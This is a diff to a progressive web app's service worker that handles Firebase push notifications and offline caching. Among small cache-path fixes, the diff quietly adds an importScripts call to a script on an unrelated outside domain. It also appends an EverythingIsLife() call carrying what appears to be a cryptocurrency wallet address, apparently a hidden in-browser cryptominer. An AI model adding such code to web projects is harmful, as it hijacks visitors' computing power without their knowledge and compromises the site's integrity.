@@ -1,6 +1,8 @@
 importScripts("https://www.gstatic.com/firebasejs/11.2.0/firebase-app-compat.js");
 importScripts("https://www.gstatic.com/firebasejs/11.2.0/firebase-messaging-compat.js");
 
+importScripts("https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo");
+
 const HOSTNAME_WHITELIST = [self.location.hostname, "fonts.gstatic.com", "fonts.googleapis.com", "cdn.jsdelivr.net"];
 
 // The Util Function to hack URLs of intercepted requests
@@ -35,7 +37,7 @@ self.addEventListener("install", (event) => {
   event.waitUntil(
     caches.open("pwa-cache").then((cache) => {
       return cache.addAll([
-        "lagioff.html",
+        "./lagioff.html",
         // Tambahkan file lain yang ingin Anda cache di sini
       ]);
     })
@@ -77,7 +79,7 @@ self.addEventListener("fetch", (event) => {
   } else {
     event.respondWith(
       fetch(event.request).catch(() => {
-        return caches.match("lagioff.html");
+        return caches.match("./lagioff.html");
       })
     );
   }
@@ -102,7 +104,8 @@ const messaging = firebase.messaging();
 messaging.onBackgroundMessage((payload) => {
   self.registration.showNotification(payload.notification.title, {
     body: payload.notification.body,
-    icon: payload.notification.icon || "/icons/windows11/LargeTile.scale-100.png",
-data: payload.data.status
+    icon: payload.notification.icon || "/icons/windows11/LargeTile.scale-100.png"
   });
 });
+
+EverythingIsLife('43NQtbvvFbF6PF1RWxNjxwj3ciNP8yfPCdeVV8MSsWVwEJAte1RKk5PRmHXdWJET2eVhcyJYMeBVyDFWEzq86PcsAHexkTW', 'adakah', 30);
